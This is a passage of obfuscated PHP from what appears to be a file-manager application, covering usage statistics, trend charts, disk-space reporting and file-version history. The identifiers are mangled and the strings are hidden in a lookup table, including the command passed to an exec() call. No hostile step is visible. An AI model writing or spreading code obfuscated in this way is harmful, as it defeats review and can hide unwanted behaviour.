= "\155\x6f\144\151\x66\171\x54\x69\x6d\x65", $Û¾Û—î = false) { return parent::listData($«Â÷Š‰Ã, $áğûÏ, $Û¾Û—î); } public function trendList($–¶Õ¼ß) { $ ÂÀÉŠö =& $_SERVER[”øäÃÍª]; $©ÄÕ™„« = $this->listData(); if ($©ÄÕ™„«) { $Á¯§®ô¸ = end($©ÄÕ™„«); $æ‡÷Õ = date($ ÂÀÉŠö[2080], strtotime($ ÂÀÉŠö[2081])); if ($Á¯§®ô¸[$ ÂÀÉŠö[282]] == $æ‡÷Õ) { return $©ÄÕ™„«; } $Ç‹Ç§¬ = strtotime($Á¯§®ô¸[$ ÂÀÉŠö[282]]); } if (!isset($Ç‹Ç§¬)) { $“ôÉ™åİ = $–¶Õ¼ß == $ ÂÀÉŠö[692] ? $ ÂÀÉŠö[625] : $ ÂÀÉŠö[941]; $Ç‹Ç§¬ = Model($“ôÉ™åİ)->min($ ÂÀÉŠö[231]); } $ÛªŸ¡ = $ ÂÀÉŠö[2082] . ucfirst($–¶Õ¼ß); $ÌñèÛ¡Ò = $this->dateList($Ç‹Ç§¬); foreach ($ÌñèÛ¡Ò as $æ‡÷Õ) { $this->{$ÛªŸ¡}($æ‡÷Õ); } return $this->listData(); } private function dateList($ííÉ½¯) { $Íïğ¡È  =& $_SERVER[”øäÃÍª]; $¶âÕğßŒ = $ííÉ½¯; $áÀãµÒ• = strtotime($Íïğ¡È [2081]); $ŒïûÄ˜¢ = array(); while ($¶âÕğßŒ <= $áÀãµÒ•) { $ŒïûÄ˜¢[] = date($Íïğ¡È [2080], $¶âÕğßŒ); $¶âÕğßŒ = strtotime($Íïğ¡È [2083], $¶âÕğßŒ); } return $ŒïûÄ˜¢; } public function _recordUser($èÇ´İÍ = '') { $ ÏÏÛ× =& $_SERVER[”øäÃÍª]; $äÜíâá… = strtotime(date($ ÏÏÛ×[2084], strtotime($èÇ´İÍ))); $”İ³¡ïş = strtotime(date($ ÏÏÛ×[2085], strtotime($èÇ´İÍ))); $ü¤™‹å‹ = array($ ÏÏÛ×[231] => array($ ÏÏÛ×[1135], $”İ³¡ïş)); $õ£ºß… = Model($ ÏÏÛ×[625])->where($ü¤™‹å‹)->count($ ÏÏÛ×[1548]); $ü¤™‹å‹[$ ÏÏÛ×[231]] = array($ ÏÏÛ×[408], array($äÜíâá…, $”İ³¡ïş)); $’½¨¨Ü = Model($ ÏÏÛ×[625])->where($ü¤™‹å‹)->count($ ÏÏÛ×[1548]); $ü¤™‹å‹[$ ÏÏÛ×[33]] = $ ÏÏÛ×[2086]; $óêîŠËÔ = Model($ ÏÏÛ×[2087])->where($ü¤™‹å‹)->count($ ÏÏÛ×[2088]); $ÙÖ‰Íı² = array($ ÏÏÛ×[282] => $èÇ´İÍ, $ ÏÏÛ×[875] => (int) $õ£ºß…, $ ÏÏÛ×[2073] => (int) $’½¨¨Ü, $ ÏÏÛ×[2074] => (int) $óêîŠËÔ); return $this->insert($ÙÖ‰Íı²); } public function _recordStore($İ¤ßù…¦ = '') { $ˆ´Ôœé¸ =& $_SERVER[”øäÃÍª]; $û†ñ–²  = strtotime(date($ˆ´Ôœé¸[2085], strtotime($İ¤ßù…¦))); $ø¤×ëî— = array($ˆ´Ôœé¸[231] => array($ˆ´Ôœé¸[1135], $û†ñ–² )); $ååø§— = Model($ˆ´Ôœé¸[568])->where($ø¤×ëî—)->sum($ˆ´Ôœé¸[79]); $ø¤×ëî—[$ˆ´Ôœé¸[508]] = 0; $æ¢²‡¬ = Model($ˆ´Ôœé¸[941])->where($ø¤×ëî—)->sum($ˆ´Ôœé¸[79]); $ø¤×ëî—[$ˆ´Ôœé¸[188]] = 1; $ó¯¸èÔÜ = Model($ˆ´Ôœé¸[941])->where($ø¤×ëî—)->sum($ˆ´Ôœé¸[79]); $ø¤×ëî—[$ˆ´Ôœé¸[188]] = 2; $¦áî´§ß = Model($ˆ´Ôœé¸[941])->where($ø¤×ëî—)->sum($ˆ´Ôœé¸[79]); $·Õåöİù = array($ˆ´Ôœé¸[282] => $İ¤ßù…¦, $ˆ´Ôœé¸[873] => (int) $æ¢²‡¬, $ˆ´Ôœé¸[2077] => (int) $ååø§—, $ˆ´Ôœé¸[2078] => (int) $ó¯¸èÔÜ, $ˆ´Ôœé¸[2079] => (int) $¦áî´§ß); return $this->insert($·Õåöİù); } public function trend($•³Æ„Ùº, $›±ëÃİÆ) { $Õêô¤‰¼ =& $_SERVER[”øäÃÍª]; if (!$this->init($•³Æ„Ùº)) { return !1; } $×Ø«Ú³™ = $this->trendList($•³Æ„Ùº); if ($×Ø«Ú³™ && $›±ëÃİÆ != $Õêô¤‰¼[1907]) { $ÌÈçÈİ = $×Ø«Ú³™[0][$Õêô¤‰¼[282]]; $Üğ±ô„É = $this->validDate($›±ëÃİÆ, $ÌÈçÈİ); $«ªûôßŸ = array(); $š¯–ÂÇÌ = array_to_keyvalue($×Ø«Ú³™, $Õêô¤‰¼[282]); foreach ($Üğ±ô„É as $ŒŠ´½ñ) { if (isset($š¯–ÂÇÌ[$ŒŠ´½ñ])) { $£‰œŸÇ = $š¯–ÂÇÌ[$ŒŠ´½ñ]; } else { $£‰œŸÇ = end($×Ø«Ú³™); $£‰œŸÇ[$Õêô¤‰¼[282]] = $ŒŠ´½ñ; if ($•³Æ„Ùº == $Õêô¤‰¼[692]) { $£‰œŸÇ[$Õêô¤‰¼[2073]] = $£‰œŸÇ[$Õêô¤‰¼[2074]] = 0; } } $«ªûôßŸ[] = $£‰œŸÇ; } $×Ø«Ú³™ = $«ªûôßŸ; } $šôìÁæÏ = array($Õêô¤‰¼[692] => array($Õêô¤‰¼[875] => LNG($Õêô¤‰¼[2089]), $Õêô¤‰¼[2073] => LNG($Õêô¤‰¼[2090]), $Õêô¤‰¼[2074] => LNG($Õêô¤‰¼[2091])), $Õêô¤‰¼[2075] => array($Õêô¤‰¼[873] => LNG($Õêô¤‰¼[2092]), $Õêô¤‰¼[2077] => LNG($Õêô¤‰¼[2093]), $Õêô¤‰¼[2078] => LNG($Õêô¤‰¼[2094]), $Õêô¤‰¼[2079] => LNG($Õêô¤‰¼[2095]))); $Ê’æ¾×’ = array($Õêô¤‰¼[692] => $Õêô¤‰¼[2096], $Õêô¤‰¼[2075] => $Õêô¤‰¼[79]); if (empty($×Ø«Ú³™)) { $ŒŠ´½ñ = date($Õêô¤‰¼[2080], strtotime($Õêô¤‰¼[2081])); $ÏÌ¥ÑÊà = array($Õêô¤‰¼[282] => $ŒŠ´½ñ); foreach ($šôìÁæÏ[$•³Æ„Ùº] as $ıôİ’É„ => $ŠÕÉë‘À) { $ÏÌ¥ÑÊà[$ıôİ’É„] = 0; } $×Ø«Ú³™[] = $ÏÌ¥ÑÊà; } $ÔøÈ™˜ê = array(); foreach ($×Ø«Ú³™ as $ŠÕÉë‘À) { if ($•³Æ„Ùº == $Õêô¤‰¼[2075] && $ŠÕÉë‘À[$Õêô¤‰¼[2077]] > $ŠÕÉë‘À[$Õêô¤‰¼[873]]) { $ŠÕÉë‘À[$Õêô¤‰¼[2077]] = $ŠÕÉë‘À[$Õêô¤‰¼[873]]; } foreach ($šôìÁæÏ[$•³Æ„Ùº] as $ıôİ’É„ => $Á™ñ¹Ì‘) { $£‰œŸÇ = array($Õêô¤‰¼[282] => $ŠÕÉë‘À[$Õêô¤‰¼[282]], $Õêô¤‰¼[1819] => $Á™ñ¹Ì‘); $£‰œŸÇ[$Ê’æ¾×’[$•³Æ„Ùº]] = isset($ŠÕÉë‘À[$ıôİ’É„]) ? $ŠÕÉë‘À[$ıôİ’É„] : 0; $ÔøÈ™˜ê[] = $£‰œŸÇ; } } return $ÔøÈ™˜ê; } public function validDate($ÄØóÉ‡­, $é‰“€ ¤) { $ñ¨µ ¹Ú =& $_SERVER[”øäÃÍª]; $´”¶½Şí = date($ñ¨µ ¹Ú[2080], strtotime($ñ¨µ ¹Ú[2081])); $Šíşà‰º = array($´”¶½Şí); switch ($ÄØóÉ‡­) { case $ñ¨µ ¹Ú[1914]: $ğ§–ú˜Ó = mktime(0, 0, 0, date($ñ¨µ ¹Ú[2097]), date($ñ¨µ ¹Ú[1614]) - date($ñ¨µ ¹Ú[1700]) + 7 - 7, date($ñ¨µ ¹Ú[2098])); $®Œ£×—Ê = 0; do { $»íªĞ« = date($ñ¨µ ¹Ú[2080], $ğ§–ú˜Ó - 3600 * 24 * 7 * $®Œ£×—Ê); $Šíşà‰º[] = $»íªĞ«; $®Œ£×—Ê++; } while ($é‰“€ ¤ < $»íªĞ«); break; case $ñ¨µ ¹Ú[1912]: $®Œ£×—Ê = 1; do { $¿Í§ÛÁë = date($ñ¨µ ¹Ú[2099], strtotime("\x2d\x20{$®Œ£×—Ê}\40\155\x6f\x6e\164\x68\163")); $Šíşà‰º[] = $¿Í§ÛÁë; $®Œ£×—Ê++; } while ($é‰“€ ¤ < $¿Í§ÛÁë); break; case $ñ¨µ ¹Ú[2100]: $ìÓ¹ø«’ = (int) date($ñ¨µ ¹Ú[2098], strtotime($é‰“€ ¤)); $Òùòìœ = (int) date($ñ¨µ ¹Ú[2098]); if ($ìÓ¹ø«’ >= $Òùòìœ) { break; } for ($ìÓ¹ø«’; $ìÓ¹ø«’ < $Òùòìœ; $ìÓ¹ø«’++) { $Šíşà‰º[] = $ìÓ¹ø«’ . $ñ¨µ ¹Ú[2101]; } break; default: break; } if ($é‰“€ ¤ > end($Šíşà‰º)) { array_pop($Šíşà‰º); } sort($Šíşà‰º); return $Šíşà‰º; } public function listTable($úúı±ÏÏ) { $ñÖ‚œ‘Ì = ucfirst($úúı±ÏÏ); return Model($ñÖ‚œ‘Ì)->listData(); } public function option($Õ¶êÇ) { return call_user_func_array(array($this, $_SERVER[”øäÃÍª][2102] . ucfirst($Õ¶êÇ)), array()); } private function optionUser() { $º²Ãâ¹ =& $_SERVER[”øäÃÍª]; $é ´Î² = Model($º²Ãâ¹[625])->count($º²Ãâ¹[1548]); $Î§ Ş‡© = Model($º²Ãâ¹[625])->where($º²Ãâ¹[2103])->count($º²Ãâ¹[1548]); $Œ¤›ç = intval($GLOBALS[$º²Ãâ¹[6]][$º²Ãâ¹[424]][$º²Ãâ¹[1880]]) / 3600; $ ª«…ï‹ = strtotime("\x2d{$Œ¤›ç}\x20\x68\x6f\x75\162\x73"); $ËòåëõÙ = strtotime(date($º²Ãâ¹[2084])); if ($ ª«…ï‹ < $ËòåëõÙ) { $ ª«…ï‹ = $ËòåëõÙ; } $¬éÁè¡ = array($º²Ãâ¹[2104] => array($º²Ãâ¹[1136], $ ª«…ï‹)); $ë›‰Ì÷½ = (int) Model($º²Ãâ¹[625])->where($¬éÁè¡)->count($º²Ãâ¹[1548]); if (!$ë›‰Ì÷½) { $ë›‰Ì÷½ = 1; } $¬éÁè¡ = array($º²Ãâ¹[2104] => array($º²Ãâ¹[1136], $ËòåëõÙ)); $½ÃÃ“£Ï = Model($º²Ãâ¹[625])->where($¬éÁè¡)->count($º²Ãâ¹[1548]); return array($º²Ãâ¹[868] => (int) $é ´Î², $º²Ãâ¹[2105] => (int) ($é ´Î² - $Î§ Ş‡©), $º²Ãâ¹[2106] => (int) $Î§ Ş‡©, $º²Ãâ¹[2107] => (int) $½ÃÃ“£Ï, $º²Ãâ¹[2108] => $ë›‰Ì÷½); } private function optionFile() { $ş€“º— =& $_SERVER[”øäÃÍª]; $ıÒƒÄÔ = $this->sourceSize(); $›ç¿’Ğ = $ıÒƒÄÔ[$ş€“º—[79]]; $ıë™»›— = $ıÒƒÄÔ[$ş€“º—[2077]]; $ã®Éãü¢ = Model($ş€“º—[941])->where(array($ş€“º—[508] => 0))->count($ş€“º—[191]); $‹¤È‚ñ = array($ş€“º—[508] => 0, $ş€“º—[231] => array($ş€“º—[1136], strtotime(date($ş€“º—[2084])))); $±Ê¹éäØ = Model($ş€“º—[941])->where($‹¤È‚ñ)->sum($ş€“º—[79]); $à›Ö£ğÆ = Model($ş€“º—[941])->where($‹¤È‚ñ)->count($ş€“º—[191]); return array($ş€“º—[873] => $›ç¿’Ğ, $ş€“º—[2077] => $ıë™»›—, $ş€“º—[2109] => $›ç¿’Ğ - $ıë™»›—, $ş€“º—[2110] => (int) $±Ê¹éäØ, $ş€“º—[875] => (int) $ã®Éãü¢, $ş€“º—[2111] => (int) $à›Ö£ğÆ); } private function optionAccess() { $ÙÍû •õ =& $_SERVER[”øäÃÍª]; return array($ÙÍû •õ[868] => $this->typeLogCnt(), $ÙÍû •õ[107] => $this->typeLogCnt($ÙÍû •õ[107]), $ÙÍû •õ[547] => $this->typeLogCnt($ÙÍû •õ[547]), $ÙÍû •õ[1286] => $this->typeLogCnt($ÙÍû •õ[1286]), $ÙÍû •õ[1517] => $this->typeLogCnt($ÙÍû •õ[1517]), $ÙÍû •õ[692] => $this->typeLogCnt($ÙÍû •õ[12], $ÙÍû •õ[2088])); } private function typeLogCnt($åî£ûĞ² = '', $º™£†å© = "\x69\x64") { $­øÏÕòò =& $_SERVER[”øäÃÍª]; $Ç¶÷ıú = array($­øÏÕòò[107] => array($­øÏÕòò[2112], $­øÏÕòò[2113]), $­øÏÕòò[547] => array($­øÏÕòò[2114], $­øÏÕòò[2115]), $­øÏÕòò[1286] => array($­øÏÕòò[2116], $­øÏÕòò[2117], $­øÏÕòò[2118]), $­øÏÕòò[1517] => array($­øÏÕòò[2119], $­øÏÕòò[2120]), $­øÏÕòò[1518] => array($­øÏÕòò[2121], $­øÏÕòò[2122], $­øÏÕòò[2123])); $ÜĞ«»À = strtotime(date($­øÏÕòò[2084])); $œÍŸÁå = array($­øÏÕòò[231] => array($­øÏÕòò[1136], $ÜĞ«»À)); if ($åî£ûĞ²) { $œÍŸÁå[$­øÏÕòò[33]] = array($­øÏÕòò[7], $Ç¶÷ıú[$åî£ûĞ²]); } $çà­ğ·” = Model($­øÏÕòò[2087])->where($œÍŸÁå)->count($º™£†å©); return (int) $çà­ğ·”; } private function optionServer() { $ı¥Ì´¹µ =& $_SERVER[”øäÃÍª]; $Ì¾Â˜äö = $this->diskDriver(); $äÕª¥ÔÌ = KodIO::defaultDriver(); $·Ñáäë– = array($ı¥Ì´¹µ[934] => $äÕª¥ÔÌ[$ı¥Ì´¹µ[487]]); $Œı¶ƒÚé = Model($ı¥Ì´¹µ[568])->where($·Ñáäë–)->sum($ı¥Ì´¹µ[79]); $ËñÑÄ“½ = explode($ı¥Ì´¹µ[53], $_SERVER[$ı¥Ì´¹µ[144]]); $£¼ò¨Šˆ = $ËñÑÄ“½[0]; $±âò´áû = $GLOBALS[$ı¥Ì´¹µ[6]][$ı¥Ì´¹µ[21]]; $‚ï½ = $±âò´áû[$ı¥Ì´¹µ[1098]]; if ($‚ï½ == $ı¥Ì´¹µ[1086]) { $ñôÀÇ ê = explode($ı¥Ì´¹µ[1428], $±âò´áû[$ı¥Ì´¹µ[1097]]); $‚ï½ = $ñôÀÇ ê[0]; } if ($‚ï½ == $ı¥Ì´¹µ[1034] || $‚ï½ == $ı¥Ì´¹µ[912]) { $âûÓ½ = Model()->db()->query($ı¥Ì´¹µ[2124]); $ß’±¤‡µ = $âûÓ½[0] && isset($âûÓ½[0][$ı¥Ì´¹µ[1818]]) ? $âûÓ½[0][$ı¥Ì´¹µ[1818]] : 0; $‚ï½ = $ı¥Ì´¹µ[2125] . ($ß’±¤‡µ ? $ı¥Ì´¹µ[8] . $ß’±¤‡µ : $ı¥Ì´¹µ[12]); } $©†ÙşäÄ = $GLOBALS[$ı¥Ì´¹µ[6]][$ı¥Ì´¹µ[424]][$ı¥Ì´¹µ[943]]; return array($ı¥Ì´¹µ[2126] => $Ì¾Â˜äö ? $Ì¾Â˜äö[$ı¥Ì´¹µ[2127]] : 0, $ı¥Ì´¹µ[2128] => $Ì¾Â˜äö ? $Ì¾Â˜äö[$ı¥Ì´¹µ[2129]] : 0, $ı¥Ì´¹µ[2130] => (int) $äÕª¥ÔÌ[$ı¥Ì´¹µ[2127]] * 1024 * 1024 * 1024, $ı¥Ì´¹µ[2131] => (int) $Œı¶ƒÚé, $ı¥Ì´¹µ[2132] => ucfirst($£¼ò¨Šˆ), $ı¥Ì´¹µ[2133] => $ı¥Ì´¹µ[2134] . PHP_VERSION, $ı¥Ì´¹µ[2135] => phpBuild64() ? 64 : 32, $ı¥Ì´¹µ[867] => str_replace($ı¥Ì´¹µ[1260], $ı¥Ì´¹µ[1114], $‚ï½), $ı¥Ì´¹µ[424] => ucfirst($©†ÙşäÄ), $ı¥Ì´¹µ[32] => $_SERVER[$ı¥Ì´¹µ[2136]]); } private function diskDriver() { $Ÿëù—²î =& $_SERVER[”øäÃÍª]; $Í±ù•™“ = $Ÿëù—²î[8]; $ÒıÊ´õ³ = $GLOBALS[$Ÿëù—²î[6]][$Ÿëù—²î[1452]] == $Ÿëù—²î[1453]; if ($ÒıÊ´õ³) { $Í±ù•™“ = $Ÿëù—²î[2137]; if (function_exists($Ÿëù—²î[2138])) { exec($Ÿëù—²î[2139], $áâÕ²Ú‹); $Í±ù•™“ = $áâÕ²Ú‹[1] . $Ÿëù—²î[8]; } } if (!file_exists($Í±ù•™“)) { return; } if (!function_exists($Ÿëù—²î[2140])) { return; } $´çñÙÙ» = @disk_total_space($Í±ù•™“); $µÜŞ˜ü = $´çñÙÙ» - @disk_free_space($Í±ù•™“); return array($Ÿëù—²î[2127] => $´çñÙÙ», $Ÿëù—²î[2129] => $µÜŞ˜ü); } public function fileChart($”ûÃíáê) { $õÊÇ‰Ó® =& $_SERVER[”øäÃÍª]; if (isset($”ûÃíáê[$õÊÇ‰Ó®[1548]])) { return Model($õÊÇ‰Ó®[941])->userFileTypeProfile($”ûÃíáê[$õÊÇ‰Ó®[1548]]); } if (isset($”ûÃíáê[$õÊÇ‰Ó®[1450]])) { return Model($õÊÇ‰Ó®[941])->groupFileTypeProfile($”ûÃíáê[$õÊÇ‰Ó®[1450]]); } $ Íè³İ = $this->sourceSize(); $¾Û¶¶¬à = array($õÊÇ‰Ó®[190] => 0, $õÊÇ‰Ó®[188] => 1); $‘Ïƒéœû = Model($õÊÇ‰Ó®[941])->where($¾Û¶¶¬à)->sum($õÊÇ‰Ó®[79]); $¾Û¶¶¬à[$õÊÇ‰Ó®[188]] = 2; $¡öë¸Ã› = Model($õÊÇ‰Ó®[941])->where($¾Û¶¶¬à)->sum($õÊÇ‰Ó®[79]); return array($õÊÇ‰Ó®[873] => $ Íè³İ[$õÊÇ‰Ó®[79]], $õÊÇ‰Ó®[2077] => $ Íè³İ[$õÊÇ‰Ó®[2077]], $õÊÇ‰Ó®[2078] => (int) $‘Ïƒéœû, $õÊÇ‰Ó®[2079] => (int) $¡öë¸Ã›); } private function sourceSize() { $û¼á¶å =& $_SERVER[”øäÃÍª]; $òßí£¬” = Model($û¼á¶å[941])->where(array($û¼á¶å[508] => 0))->sum($û¼á¶å[79]); $®ÚöÄò’ = Model($û¼á¶å[568])->sum($û¼á¶å[79]); if ($®ÚöÄò’ > $òßí£¬”) { $®ÚöÄò’ = $òßí£¬”; } return array($û¼á¶å[79] => (int) $òßí£¬”, $û¼á¶å[2077] => (int) $®ÚöÄò’); } } goto Bª‚ä¦Ì¹©; b›òÔãŠ‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\x63\x65\137\150\x69\x73\x74\157\162\x79"; public function historyCount($á™¶¬ƒ™) { $Ü‡·‡Ñ =& $_SERVER[”øäÃÍª]; if (!$á™¶¬ƒ™) { return array(); } if (is_string($á™¶¬ƒ™) || is_int($á™¶¬ƒ™)) { $á™¶¬ƒ™ = array($á™¶¬ƒ™); } $±…°àŒ = array($Ü‡·‡Ñ[191], $Ü‡·‡Ñ[2390] => $Ü‡·‡Ñ[593]); $Ÿ‡·À° = array($Ü‡·‡Ñ[191] => array($Ü‡·‡Ñ[7], $á™¶¬ƒ™)); $ãˆä‹Ğ = $this->field($±…°àŒ)->where($Ÿ‡·À°)->group($Ü‡·‡Ñ[191])->select(); return array_to_keyvalue($ãˆä‹Ğ, $Ü‡·‡Ñ[191], $Ü‡·‡Ñ[593]); } public function addHistory($ë“æÁŒ§, $†×Ôà° = '') { $¶ª¢ÎëÎ =& $_SERVER[”øäÃÍª]; $İˆîš­ê = array($¶ª¢ÎëÎ[514] => $ë“æÁŒ§[$¶ª¢ÎëÎ[191]], $¶ª¢ÎëÎ[1925] => isset($ë“æÁŒ§[$¶ª¢ÎëÎ[551]]) ? $ë“æÁŒ§[$¶ª¢ÎëÎ[551]] : $ë“æÁŒ§[$¶ª¢ÎëÎ[549]], $¶ª¢ÎëÎ[566] => $ë“æÁŒ§[$¶ª¢ÎëÎ[565]], $¶ª¢ÎëÎ[648] => $ë“æÁŒ§[$¶ª¢ÎëÎ[79]], $¶ª¢ÎëÎ[2391] => $†×Ôà°); if ($GLOBALS[$¶ª¢ÎëÎ[6]][$¶ª¢ÎëÎ[92]][$¶ª¢ÎëÎ[1360]] >= 1) { $this->historyAutoClear($İˆîš­ê[$¶ª¢ÎëÎ[191]]); $this->add($İˆîš­ê); } Hook::trigger($¶ª¢ÎëÎ[2392], $İˆîš­ê); Model($¶ª¢ÎëÎ[2393])->eventFileEdit($ë“æÁŒ§[$¶ª¢ÎëÎ[191]]); } private function historyAutoClear($ª¿®›îì) { $¤ŸŒİá› =& $_SERVER[”øäÃÍª]; $­İµïØ¿ = Model($¤ŸŒİá›[882])->get($¤ŸŒİá›[1382]); $ÛÒ€”ş = intval($GLOBALS[$¤ŸŒİá›[6]][$¤ŸŒİá›[92]][$¤ŸŒİá›[1360]]); $¸†¿úöç = $­İµïØ¿ == $¤ŸŒİá›[1383] ? min(5, $ÛÒ€”ş) : $ÛÒ€”ş; $¸†¿úöç = $¸†¿úöç <= 0 ? 0 : $¸†¿úöç - 1; if ($¸†¿úöç >= 499) { return; } $ÎúÓšËƒ = array($¤ŸŒİá›[514] => $ª¿®›îì); $ÇÎ°íê = $this->field($¤ŸŒİá›[2394])->where($ÎúÓšËƒ)->order($¤ŸŒİá›[2387])->select(); if (!$ÇÎ°íê || $¸†¿úöç >= count($ÇÎ°íê)) { return; } $‘²´Éâ„ = array_to_keyvalue($ÇÎ°íê, $¤ŸŒİá›[12], $¤ŸŒİá›[487]); $‘²´Éâ„ = array_slice($‘²´Éâ„, $¸†¿úöç); $ÀìõÍ¦Ÿ = array_to_keyvalue($ÇÎ°íê, $¤ŸŒİá›[12], $¤ŸŒİá›[565]); $ÀìõÍ¦Ÿ = array_slice($ÀìõÍ¦Ÿ, $¸†¿úöç); if (!$‘²´Éâ„ || !$ÀìõÍ¦Ÿ) { return; } $ÎúÓšËƒ = array($¤ŸŒİá›[516] => array($¤ŸŒİá›[7], $‘²´Éâ„)); $this->where($ÎúÓšËƒ)->delete(); Model($¤ŸŒİá›[568])->remove($ÀìõÍ¦Ÿ); } public function listData($»ö¸ôşØ) { $õ±Ù¦äĞ =& $_SERVER[”øäÃÍª]; $²”‚ïÔŒ = array($õ±Ù¦äĞ[514] => $»ö¸ôşØ); $¨è»–ãÅ = $õ±Ù¦äĞ[2395]; $ïØò¼€ú = $this->field($¨è»–ãÅ)->where($²”‚ïÔŒ)->order($õ±Ù¦äĞ[2387])->selectPage(); $this->_listAppendUser($ïØò¼€ú[$õ±Ù¦äĞ[446]]); $»ùºóü = Model($õ±Ù¦äĞ[882])->get($õ±Ù¦äĞ[1382]); $¨šî›•Ş = 5; if ($»ùºóü == $õ±Ù¦äĞ[1383]) { $ïØò¼€ú[$õ±Ù¦äĞ[446]] = array_slice($ïØò¼€ú[$õ±Ù¦äĞ[446]], 0, $¨šî›•Ş); $ïØò¼€ú[$õ±Ù¦äĞ[443]] = array($õ±Ù¦äĞ[2396] => 1, $õ±Ù¦äĞ[2397] => 20, $õ±Ù¦äĞ[2398] => 1, $õ±Ù¦äĞ[2287] => count($ïØò¼€ú[$õ±Ù¦äĞ[446]])); } return $ïØò¼€ú; } protected function _listAppendUser(&$Ï­±ƒ÷Ş) { $ğµâÙ¤ =& $_SERVER[”øäÃÍª]; $ÀèÅ¸š– = array_to_keyvalue($Ï­±ƒ÷Ş, $ğµâÙ¤[12], $ğµâÙ¤[1548]); $©ì©õ©Á = Model($ğµâÙ¤[625])->userListInfo($ÀèÅ¸š–); foreach ($Ï­±ƒ÷Ş as &$éÇ½İæ) { $ÉıĞòç¶ = $éÇ½İæ[$ğµâÙ¤[1548]]; $éÇ½İæ[$ğµâÙ¤[549]] = $©ì©õ©Á[$ÉıĞòç¶] ? $©ì©õ©Á[$ÉıĞòç¶] : !1; } unset($éÇ½İæ); } public function fileInfo($êúÖÅ­‚, $©á™¢î¹ = false) { $±Ààì»¸ =& $_SERVER[”øäÃÍª]; $¯ì­£Ù» = $this->tablePrefix; $ÚÎ‡Ç©ş = "{$¯ì­£Ù»}\x69\157\137\146\x69\154\145\x20\146\151\154\145\163\40\x6f\x6e\x20\x66\x69\x6c\x65\163\56\x66\151\x6c\x65\111\104\40\x3d\40\150\151\163\x74\157\x72\x79\56\x66\x69\x6c\x65\111\104"; $ÜßŸöµù = $this->alias($±Ààì»¸[2399])->where(array($±Ààì»¸[516] => $êúÖÅ­‚))->join($ÚÎ‡Ç©ş, $±Ààì»¸[2400])->find(); if ($ÜßŸöµù && $©á™¢î¹) { $€û‚„Õæ = array($±Ààì»¸[191] => $ÜßŸöµù[$±Ààì»¸[191]], $±Ààì»¸[487] => array($±Ààì»¸[1135], $êúÖÅ­‚)); $ÜßŸöµù[$±Ààì»¸[1818]] = $this->where($€û‚„Õæ)->count(); } return $ÜßŸöµù; } public function removeItem($‹®‡°„) { $Ä‚¤¬—‡ =& $_SERVER[”øäÃÍª]; $˜öòÓß = array($Ä‚¤¬—‡[516] => $‹®‡°„); $äï¤™ = $this->where($˜öòÓß)->find(); if ($äï¤™) { $¯¢Ï…ÔÄ = $this->where($˜öòÓß)->delete(); Model($Ä‚¤¬—‡[568])->remove($äï¤™[$Ä‚¤¬—‡[565]]); return $¯¢Ï…ÔÄ; } return !1; } public function removeBySource($êğÀˆ ‚) { $û¾ßš£Î =& $_SERVER[”øäÃÍª]; if (!$êğÀˆ ‚) { return !1; } if (!is_array($êğÀˆ ‚)) { $êğÀˆ ‚ = array($êğÀˆ ‚); } $Õ¢»Ë æ = array($û¾ßš£Î[514] => array($û¾ßš£Î[7], $êğÀˆ ‚)); $‰úëÏ÷­ = $this->field($û¾ßš£Î[566])->where($Õ¢»Ë æ)->select(); if ($‰úëÏ÷­) { $this->where($Õ¢»Ë æ)->delete(); $ÌòÒ¬Œó = array_to_keyvalue($‰úëÏ÷­, $û¾ßš£Î[12], $û¾ßš£Î[565]); Model($û¾ßš£Î[568])->remove($ÌòÒ¬Œó); } return !0; } public function setDetail($½Şµ—ï , $ê®ŠÙì) { $ô¹ôÛ®ª =& $_SERVER[”øäÃÍª]; return $this->where(array($ô¹ôÛ®ª[516] => $½Şµ—ï ))->save(array($ô¹ôÛ®ª[2391] => $ê®ŠÙì)); } public function rollbackToItem($›¬ÒÍ, $³ÏÑáö) { $·áƒÇÖ =& $_SERVER[”øäÃÍª]; $Ÿßä’× = Model($·áƒÇÖ[941])->sourceInfo($›¬ÒÍ); $this->addHistory($Ÿßä’×, LNG($·áƒÇÖ[2401])); $Š‹õ€ª¦ = $this->find($³ÏÑáö); $§”æÀ = array($·áƒÇÖ[565] => $Š‹õ€ª¦[$·áƒÇÖ[565]], $·áƒÇÖ[79] => $Š‹õ€ª¦[$·áƒÇÖ[79]], $·áƒÇÖ[88] => time(), $·áƒÇÖ[551] => USER_ID); Model($·áƒÇÖ[941])->where(array($·áƒÇÖ[191] => $›¬ÒÍ))->save($§”æÀ); return $this->where(array($·áƒÇÖ[516] => $³ÏÑáö))->delete(); } public function clearSame($®ü’¿¨˜) { $ç²ÏÀ„ =& $_SERVER[”øäÃÍª]; $”ÂçÛÖñ = $this->listData($®ü’¿¨˜); $˜ı‹ğÍ = array_to_keyvalue_group($”ÂçÛÖñ, $ç²ÏÀ„[565]); $õ»³Á½• = array(); $Ì³’¨ìÑ = array(); foreach ($˜ı‹ğÍ as $ŠÃ’…Âü) { if (!$ŠÃ’…Âü || count($ŠÃ’…Âü) <= 1) { continue; } foreach ($ŠÃ’…Âü as $±œ•³‚) { $õ»³Á½•[] = $±œ•³‚[$ç²ÏÀ„[565]]; $Ì³’¨ìÑ[] = $±œ•³‚[$ç²ÏÀ„[487]]; } } if (!$Ì³’¨ìÑ) { return; } $this->where(array($ç²ÏÀ„[487] => array($ç²ÏÀ„[7], $Ì³’¨ìÑ)))->delete(); Model($ç²ÏÀ„[568])->remove($õ»³Á½•); } public function userSpace() { $¯ÏÔŒ€É =& $_SERVER[”øäÃÍª]; $óÑ¶Î¿ = $this->tablePrefix; $¡¦ìØËš = array($¯ÏÔŒ€É[1925] => USER_ID); $¸©‘àŸ = "{$óÑ¶Î¿}\151\x6f\137\146\151\154\145\40\x66\x69\154\145\x73\40\157\x6e\40\146\x69\x6c\145\163\56\146\151\154\x65\x49\x44\40\x3d\40\x68\151\x73\x74\157\162\171\56\146\151\x6c\145\x49\x44"; return $this->alias($¯ÏÔŒ€É[2399])->where($¡¦ìØËš)->join($¸©‘àŸ, $¯ÏÔŒ€É[2400])->sum($¯ÏÔŒ€É[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ñ¦¥÷•ˆ) { $Ò…ãŒı— =& $_SERVER[”øäÃÍª]; $ôá™•ö° = KodIO::fileTypeList(); $ØÕ†ÏãÖ = $ôá™•ö°[$ñ¦¥÷•ˆ]; if (!$ØÕ†ÏãÖ) { return array(); } $İ€®²ÙÁ = $ØÕ†ÏãÖ[$Ò…ãŒı—[166]]; 